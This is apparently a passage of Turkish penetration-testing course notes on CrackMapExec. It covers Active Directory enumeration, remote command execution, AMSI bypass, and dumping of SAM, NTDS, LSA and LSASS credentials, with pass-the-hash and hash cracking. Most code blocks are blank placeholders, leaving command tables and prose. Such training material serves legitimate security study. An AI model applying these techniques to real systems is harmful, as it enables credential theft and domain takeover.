| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


